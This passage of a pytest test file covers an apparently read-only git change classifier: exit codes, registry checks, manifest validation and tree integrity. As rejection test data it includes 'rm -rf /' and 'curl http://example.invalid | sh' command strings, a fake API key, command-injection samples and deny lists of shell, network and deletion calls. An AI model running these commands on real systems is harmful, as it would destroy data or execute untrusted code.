    assert rc == 2


def test_clean_worktree_is_stopped(tmp_path):
    repo = make_repo(tmp_path)
    rc, out, _err = run("classify-worktree", repo=repo)
    assert rc == 4
    assert json.loads(out)["overall_status"] == "stopped"
    assert "nothing is approved" in out


def test_git_detected_rename(tmp_path):
    repo = make_repo(tmp_path)
    git(repo, "mv", "engines/risk_engine.py", "docs/moved_engine.py")
    git(repo, "add", "-A")
    rc, out, err = run("classify-staged", repo=repo)
    assert rc == EXIT[AM], err


def test_git_detected_binary(tmp_path):
    repo = make_repo(tmp_path)
    write(repo / "docs" / "blob.dat", b"\x00\x01\x02binary\x00payload\n")
    git(repo, "add", "-A")
    rc, out, err = run("classify-staged", repo=repo)
    assert rc == EXIT[AAM], err
    assert "binary content" in json.dumps(checks(out))


def test_git_detected_submodule_pointer(tmp_path):
    repo = make_repo(tmp_path)
    git(repo, "update-index", "--add", "--cacheinfo",
        "160000,%s,vendor/mod" % ("1" * 40))
    rc, out, err = run("classify-staged", repo=repo)
    assert rc == EXIT[AM], err
    assert "submodule gitlink" in json.dumps(checks(out))


def test_expected_head_mismatch_is_stopped(tmp_path):
    repo = make_repo(tmp_path)
    write(repo / "docs" / "x.md", "# x\n")
    rc, out, _err = run("classify-worktree", repo=repo,
                        extra=["--expected-head", "f" * 40])
    assert rc == 4
    assert "HEAD" in out


def test_expected_head_match_proceeds(tmp_path):
    repo = make_repo(tmp_path)
    write(repo / "docs" / "x.md", "# x\n")
    rc, out, err = run("classify-worktree", repo=repo,
                       extra=["--expected-head", git(repo, "rev-parse", "HEAD")])
    assert rc == EXIT[AAM], err


def test_expected_branch_mismatch_is_stopped(tmp_path):
    repo = make_repo(tmp_path)
    write(repo / "docs" / "x.md", "# x\n")
    rc, out, _err = run("classify-worktree", repo=repo,
                        extra=["--expected-branch", "elsewhere"])
    assert rc == 4


def test_moved_head_during_observation_is_stopped(tmp_path, monkeypatch):
    repo = make_repo(tmp_path)
    write(repo / "docs" / "x.md", "# x\n")
    seen = {"n": 0}
    real = cc._git_ok

    def drifting(r, args):
        if args[:2] == ["rev-parse", "HEAD"]:
            seen["n"] += 1
            if seen["n"] > 1:
                return "f" * 40 + "\n"
        return real(r, args)

    monkeypatch.setattr(cc, "_git_ok", drifting)
    out, code = _inprocess(["classify-worktree", "--format", "json",
                            "--repo", str(repo)])
    assert code == 4
    assert any("moved during observation" in c["evidence"] for c in out)


# ------------------------------------------------------------------- registry

def reg_session(repo, sid="boot-session", status="active", beat=None,
                branch="work", head=None, identity=None):
    from datetime import datetime, timezone
    now = beat or datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
    return {"session_id": sid, "worktree_identity": identity or repo.name,
            "canonical_worktree_path": str(repo), "branch": branch,
            "task": "classify", "read_scope": [], "write_scope": [],
            "protected_scope": [], "started_at": now, "heartbeat_at": now,
            "status": status, "owner": "tester",
            "expected_commit": head or git(repo, "rev-parse", "HEAD")}


def write_registry(tmp_path, sessions, name="registry.json"):
    p = tmp_path / name
    p.write_text(json.dumps({"schema_version": 1, "revision": 1,
                             "sessions": list(sessions)}, indent=2) + "\n",
                 encoding="utf-8")
    return p


def test_matching_registry_session_is_accepted(tmp_path):
    repo = make_repo(tmp_path)
    reg = write_registry(tmp_path, [reg_session(repo)])
    write(repo / "docs" / "x.md", "# x\n")
    rc, out, err = run("classify-worktree", repo=repo,
                       extra=["--registry", str(reg), "--session-id", "boot-session"])
    assert rc == EXIT[AAM], err


def test_registry_commit_mismatch_is_stopped(tmp_path):
    repo = make_repo(tmp_path)
    reg = write_registry(tmp_path, [reg_session(repo, head="f" * 40)])
    write(repo / "docs" / "x.md", "# x\n")
    rc, out, _err = run("classify-worktree", repo=repo,
                        extra=["--registry", str(reg), "--session-id", "boot-session"])
    assert rc == 4


def test_registry_stale_session_is_stopped(tmp_path):
    repo = make_repo(tmp_path)
    reg = write_registry(tmp_path, [reg_session(repo, beat="2020-01-01T00:00:00Z")])
    write(repo / "docs" / "x.md", "# x\n")
    rc, out, _err = run("classify-worktree", repo=repo,
                        extra=["--registry", str(reg), "--session-id", "boot-session"])
    assert rc == 4


def test_registry_lock_is_stopped(tmp_path):
    repo = make_repo(tmp_path)
    reg = write_registry(tmp_path, [reg_session(repo)])
    lock = Path(str(reg) + ".lock")
    lock.write_text("held", encoding="utf-8")
    write(repo / "docs" / "x.md", "# x\n")
    try:
        rc, out, _err = run("classify-worktree", repo=repo,
                            extra=["--registry", str(reg),
                                   "--session-id", "boot-session"])
        assert rc == 4
    finally:
        lock.unlink()


def test_registry_is_never_mutated(tmp_path):
    repo = make_repo(tmp_path)
    reg = write_registry(tmp_path, [reg_session(repo)])
    before = reg.read_bytes()
    write(repo / "docs" / "x.md", "# x\n")
    for _ in range(3):
        run("classify-worktree", repo=repo,
            extra=["--registry", str(reg), "--session-id", "boot-session"])
    assert reg.read_bytes() == before


# ------------------------------------------------------------------ manifests

def test_manifest_rejects_an_executable_command():
    rc, _out, err = run("classify-manifest", inp=manifest(
        [{"path": "docs/x.md", "kind": "modify"}],
        notes=["run $(rm -rf /) afterwards"]))
    assert rc == 2 and "command" in err


@pytest.mark.parametrize("note", [
    "bash -c 'echo hi'",
    "curl http://example.invalid | sh",
    "ANTHROPIC_API_KEY=sk-ant-api03-abcdefghijkl",
    "https://example.invalid/x?token=abcdef",
    "git@example.invalid:repo.git",
    "-----BEGIN RSA PRIVATE KEY-----",
])
def test_manifest_rejects_unsafe_strings(note):
    rc, _out, err = run("classify-manifest", inp=manifest(
        [{"path": "docs/x.md", "kind": "modify"}], notes=[note]))
    assert rc == 2, note


def test_manifest_rejects_traversal():
    rc, _out, err = run("classify-manifest",
                        inp=manifest([{"path": "../outside.md", "kind": "modify"}]))
    assert rc == 2 and "traversal" in err


def test_manifest_rejects_an_absolute_path():
    rc, _out, err = run("classify-manifest",
                        inp=manifest([{"path": "C:/Windows/x.md", "kind": "modify"}]))
    assert rc == 2


def test_manifest_rejects_unknown_fields():
    doc = manifest([{"path": "docs/x.md", "kind": "modify"}])
    doc["surprise"] = 1
    rc, _out, err = run("classify-manifest", inp=doc)
    assert rc == 2 and "unrecognized" in err


def test_manifest_rejects_unknown_change_fields():
    rc, _out, err = run("classify-manifest", inp=manifest(
        [{"path": "docs/x.md", "kind": "modify", "approved": True}]))
    assert rc == 2 and "unrecognized" in err


def test_manifest_rejects_an_unknown_operation():
    rc, _out, err = run("classify-manifest", inp=manifest(
        [{"path": "docs/x.md", "kind": "modify"}], operation="just-do-it"))
    assert rc == 2


def test_manifest_rejects_a_malformed_hash():
    rc, _out, err = run("classify-manifest", inp=manifest(
        [{"path": "docs/x.md", "kind": "modify", "new_hash": "abc"}]))
    assert rc == 2


def test_manifest_rejects_duplicate_path_and_kind():
    rc, _out, err = run("classify-manifest", inp=manifest([
        {"path": "docs/x.md", "kind": "modify"},
        {"path": "docs/x.md", "kind": "modify"}]))
    assert rc == 2 and "duplicates" in err


def test_manifest_rejects_a_malformed_finding():
    rc, _out, err = run("classify-manifest", inp=manifest(
        [{"path": "docs/x.md", "kind": "modify", "semantic_findings": ["Bad Name!"]}]))
    assert rc == 2


def test_manifest_change_ceiling(tmp_path):
    doc = policy_doc()
    doc["limits"]["max_changes"] = 2
    pol = write_policy(tmp_path, doc)
    rc, _out, err = run("classify-manifest", policy=pol, inp=manifest(
        [{"path": "docs/%d.md" % i, "kind": "modify"} for i in range(5)]))
    assert rc == 3


def test_oversized_manifest_is_a_safety_limit(tmp_path):
    big = tmp_path / "big.json"
    big.write_bytes(b'{"schema_version":1,"changes":[],"notes":["'
                    + b"x" * (cc.MAX_INPUT_BYTES + 16) + b'"]}')
    rc, _out, err = run("classify-manifest", extra=["--input", str(big)])
    assert rc == 3


def test_empty_manifest_input_is_rejected(tmp_path):
    empty = tmp_path / "empty.json"
    empty.write_text("", encoding="utf-8")
    rc, _out, err = run("classify-manifest", extra=["--input", str(empty)])
    assert rc == 2


def test_manifest_path_length_ceiling(tmp_path):
    doc = policy_doc()
    doc["limits"]["max_path_chars"] = 20
    pol = write_policy(tmp_path, doc)
    rc, _out, err = run("classify-manifest", policy=pol, inp=manifest(
        [{"path": "docs/" + ("a" * 60) + ".md", "kind": "modify"}]))
    assert rc == 3


# -------------------------------------------------------------------- safety

def _tree_digest(root):
    h = hashlib.sha256()
    for dirpath, dirnames, filenames in os.walk(root):
        dirnames.sort()
        for name in sorted(filenames):
            full = os.path.join(dirpath, name)
            h.update(os.path.relpath(full, root).replace("\\", "/").encode("utf-8"))
            try:
                h.update(open(full, "rb").read())
            except OSError:
                h.update(b"<unreadable>")
    return h.hexdigest()


def _inprocess(argv):
    buf = io.BytesIO()
    real_stdout = sys.stdout

    class _Cap:
        buffer = buf

        def write(self, _s):
            return 0

        def flush(self):
            return None

    sys.stdout = _Cap()
    try:
        code = cc.main(argv)
    finally:
        sys.stdout = real_stdout
    text = buf.getvalue().decode("utf-8")
    return (json.loads(text)["checks"] if text.strip() else []), code


def test_git_refs_index_config_and_fetch_head_unchanged(tmp_path):
    repo = make_repo(tmp_path)
    write(repo / "docs" / "x.md", "# x\n")
    git(repo, "add", "-A")
    gitdir = repo / ".git"
    before = {
        "refs": _tree_digest(gitdir / "refs"),
        "head": (gitdir / "HEAD").read_bytes(),
        "index": (gitdir / "index").read_bytes(),
        "config": (gitdir / "config").read_bytes(),
        "fetch_head": (gitdir / "FETCH_HEAD").exists(),
        "status": git(repo, "status", "--porcelain", "-uall"),
    }
    run("classify-worktree", repo=repo)
    run("classify-staged", repo=repo)
    run("classify-commit", repo=repo, extra=["--commit", git(repo, "rev-parse", "HEAD")])
    assert _tree_digest(gitdir / "refs") == before["refs"]
    assert (gitdir / "HEAD").read_bytes() == before["head"]
    assert (gitdir / "index").read_bytes() == before["index"]
    assert (gitdir / "config").read_bytes() == before["config"]
    assert (gitdir / "FETCH_HEAD").exists() == before["fetch_head"]
    assert git(repo, "status", "--porcelain", "-uall") == before["status"]


def test_repository_is_byte_identical_afterwards(tmp_path):
    repo = make_repo(tmp_path)
    write(repo / "docs" / "x.md", "# x\n")
    before = _tree_digest(repo)
    run("classify-worktree", repo=repo)
    run("classify-worktree", repo=repo)
    assert _tree_digest(repo) == before


def test_input_and_policy_files_are_byte_identical_afterwards(tmp_path):
    m = tmp_path / "m.json"
    m.write_text(json.dumps(manifest([{"path": "docs/x.md", "kind": "modify"}])),
                 encoding="utf-8")
    before, pol_before = m.read_bytes(), POLICY.read_bytes()
    run("classify-manifest", extra=["--input", str(m)])
    assert m.read_bytes() == before
    assert POLICY.read_bytes() == pol_before


def test_no_lock_or_temp_residue(tmp_path):
    repo = make_repo(tmp_path)
    write(repo / "docs" / "x.md", "# x\n")
    run("classify-worktree", repo=repo)
    for dirpath, _dirs, files in os.walk(repo):
        for name in files:
            low = name.lower()
            assert not low.endswith(".tmp"), name
            assert not low.startswith(".nova-"), name
            assert not low.endswith(".lock") or ".git" in dirpath, name


def test_output_is_deterministic(tmp_path):
    repo = make_repo(tmp_path)
    write(repo / "docs" / "x.md", "# x\n")
    write(repo / "core" / "config.py", "F = 1\n")
    for mode, fmt in (("classify-worktree", "json"), ("classify-worktree", "markdown"),
                      ("validate-policy", "json"), ("validate-policy", "markdown")):
        first = run(mode, repo=repo, fmt=fmt)[1]
        second = run(mode, repo=repo, fmt=fmt)[1]
        assert first == second, (mode, fmt)


def test_no_username_absolute_path_or_url_in_output(tmp_path):
    repo = make_repo(tmp_path)
    write(repo / "docs" / "x.md", "# x\n")
    for mode in ("classify-worktree", "validate-policy"):
        rc, out, err = run(mode, repo=repo)
        blob = out + err
        assert str(tmp_path) not in blob, mode
        assert "C:\\Users" not in blob and "C:/Users" not in blob, mode
        assert "https://" not in blob and "http://" not in blob, mode


def test_registry_contents_are_never_printed(tmp_path):
    repo = make_repo(tmp_path)
    reg = write_registry(tmp_path, [reg_session(repo)])
    write(repo / "docs" / "x.md", "# x\n")
    rc, out, err = run("classify-worktree", repo=repo,
                       extra=["--registry", str(reg), "--session-id", "boot-session"])
    blob = out + err
    assert str(repo) not in blob
    assert "canonical_worktree_path" not in blob


def test_no_content_from_a_file_is_executed(tmp_path):
    repo = make_repo(tmp_path)
    marker = repo / "must_not_exist.txt"
    write(repo / "docs" / "x.md",
          "$(echo hi > must_not_exist.txt)\n`touch must_not_exist.txt`\n"
          "import os; os.system('echo hi')\n")
    run("classify-worktree", repo=repo)
    assert not marker.exists()


def test_the_word_approved_is_never_an_output_verdict(tmp_path):
    repo = make_repo(tmp_path)
    write(repo / "docs" / "x.md", "# x\n")
    rc, out, _err = run("classify-worktree", repo=repo)
    doc = json.loads(out)
    assert doc["overall_status"] in ("passed", "passed_with_warnings", "failed",
                                    "stopped")
    for c in doc["checks"]:
        assert c["evidence"].strip().lower() != "approved"
    assert "not an approval" in out


# ------------------------------------------------------------- static safety

def _executable_source(path):
    src = Path(path).read_text(encoding="utf-8")
    docstrings = set()
    for node in ast.walk(ast.parse(src)):
        if isinstance(node, (ast.Module, ast.FunctionDef, ast.AsyncFunctionDef,
                             ast.ClassDef)):
            doc = ast.get_docstring(node, clean=False)
            if doc is not None:
                docstrings.add(doc)
    kept = []
    for tok in tokenize.generate_tokens(io.StringIO(src).readline):
        if tok.type == tokenize.COMMENT:
            continue
        if tok.type == tokenize.STRING:
            try:
                value = ast.literal_eval(tok.string)
            except Exception:
                value = None
            if isinstance(value, str) and value in docstrings:
                continue
        kept.append(tok.string)
    return "\n".join(kept)


def _identifiers(path):
    src = Path(path).read_text(encoding="utf-8")
    return {tok.string for tok in tokenize.generate_tokens(io.StringIO(src).readline)
            if tok.type == tokenize.NAME}


def _dotted(node):
    parts = []
    while isinstance(node, ast.Attribute):
        parts.append(node.attr)
        node = node.value
    if isinstance(node, ast.Name):
        parts.append(node.id)
        return ".".join(reversed(parts))
    return None


def _dotted_names(path):
    names = set()
    for node in ast.walk(ast.parse(Path(path).read_text(encoding="utf-8"))):
        if isinstance(node, ast.Attribute):
            d = _dotted(node)
            if d:
                names.add(d)
    return names


def _git_verbs(path):
    verbs = set()
    for node in ast.walk(ast.parse(Path(path).read_text(encoding="utf-8"))):
        if not isinstance(node, ast.Call):
            continue
        name = _dotted(node.func) or getattr(node.func, "id", None)
        if name not in ("_git", "_git_ok", "a7._git", "a7._git_ok"):
            continue
        for arg in node.args:
            if isinstance(arg, ast.List) and arg.elts:
                first = arg.elts[0]
                if isinstance(first, ast.Constant) and isinstance(first.value, str):
                    verbs.add(first.value)
    return verbs


def test_stdlib_only():
    mods = set()
    for node in ast.walk(ast.parse(CLASSIFIER.read_text(encoding="utf-8"))):
        if isinstance(node, ast.Import):
            mods.update(a.name.split(".")[0] for a in node.names)
        elif isinstance(node, ast.ImportFrom) and node.module:
            mods.add(node.module.split(".")[0])
    third = [m for m in mods if m not in sys.stdlib_module_names
             and m not in ("__future__", "evidence_formatter", "staleness_guard",
                           "session_registry", "a7_battery")]
    assert third == [], third


def test_no_eval_or_exec():
    idents = _identifiers(CLASSIFIER)
    for banned in ("eval", "exec", "__import__", "globals", "locals"):
        assert banned not in idents, banned
    # `compile` is permitted only as `re.compile`; a bare compile() is not.
    for node in ast.walk(ast.parse(CLASSIFIER.read_text(encoding="utf-8"))):
        if isinstance(node, ast.Call) and isinstance(node.func, ast.Name):
            assert node.func.id != "compile"
    assert _dotted_names(CLASSIFIER) & {"re.compile"}


def test_no_shell_subprocess_or_network():
    idents = _identifiers(CLASSIFIER)
    names = _dotted_names(CLASSIFIER)
    for banned in ("subprocess", "socket", "urllib", "requests", "ftplib",
                   "smtplib", "telnetlib", "asyncio", "popen", "system"):
        assert banned not in idents, banned
    for banned in ("os.system", "subprocess.run", "subprocess.Popen"):
        assert banned not in names, banned


def test_no_environment_value_reads():
    idents = _identifiers(CLASSIFIER)
    names = _dotted_names(CLASSIFIER)
    for banned in ("environ", "getenv", "expanduser", "expandvars", "getpass"):
        assert banned not in idents, banned
    for banned in ("os.environ", "os.getenv", "os.path.expanduser"):
        assert banned not in names, banned


def test_no_write_mode_open():
    import re as _re
    body = _executable_source(CLASSIFIER)
    for m in _re.finditer(r"open\(([^)]*)\)", body):
        assert not _re.search(r"['\"][wax]", m.group(1)), m.group(0)


def test_no_deletion_move_or_write_helper():
    idents = _identifiers(CLASSIFIER)
    names = _dotted_names(CLASSIFIER)
    for banned in ("remove", "unlink", "rmdir", "mkdir", "makedirs", "shutil",
                   "rmtree", "write_text", "write_bytes", "chmod", "symlink"):
        assert banned not in idents, banned
    for banned in ("os.remove", "os.unlink", "os.rename", "os.replace",
                   "os.mkdir", "os.makedirs", "shutil.rmtree"):
        assert banned not in names, banned


def test_no_mutating_git_verb_is_ever_requested():
    mutating = {"fetch", "pull", "push", "merge", "rebase", "checkout", "switch",
                "reset", "restore", "clean", "commit", "worktree", "submodule",
                "update-index", "gc", "maintenance", "add", "stash", "config",
                "apply", "cherry-pick", "revert", "tag", "branch", "mv", "rm"}
    asked = _git_verbs(CLASSIFIER)
    assert asked, "no git verb was found; the scan would be vacuous"
    assert not (asked & mutating), sorted(asked & mutating)


def test_every_git_verb_is_inside_the_a7_read_only_allowlist():
    sys.path.insert(0, str(CLASSIFIER.parent))
    try:
        import a7_battery as a7
    finally:
        sys.path.pop(0)
    asked = _git_verbs(CLASSIFIER)
    assert asked <= set(a7._A7_GIT_READ_ONLY), sorted(asked - set(a7._A7_GIT_READ_ONLY))


def test_git_is_reached_only_through_the_a7_helper():
    names = _dotted_names(CLASSIFIER)
    assert "a7._git" in names or "a7._git_ok" in names


def test_no_session_registry_mutation():
    names = _dotted_names(CLASSIFIER)
    for banned in ("sr.write_registry_atomic", "sr._Lock", "sr.advance",
                   "sr.register", "sr.heartbeat", "sr.close"):
        assert banned not in names, banned
    assert "write_registry_atomic" not in _executable_source(CLASSIFIER)


def test_rendering_goes_through_the_evidence_formatter():
    names = _dotted_names(CLASSIFIER)
    assert {"ef.render_markdown", "ef.render_json", "ef.normalize"} <= names


def test_no_function_named_for_an_approval_or_mutation():
    tree = ast.parse(CLASSIFIER.read_text(encoding="utf-8"))
    for node in ast.walk(tree):
        if isinstance(node, ast.FunctionDef):
            for verb in ("approve", "authorize", "grant", "apply", "stage",
                         "commit", "push", "deploy"):
                assert node.name != verb, node.name


def test_no_output_path_can_produce_an_approval_verdict():
    """There is no class, status, or escalation string meaning 'approved'."""
    assert "approved" not in [c.lower() for c in cc.CLASS_ORDER]
    for value in cc._ESCALATION.values():
        assert "approved" not in value.lower()
    assert set(cc.EXIT_BY_CLASS) == set(cc.CLASS_ORDER)
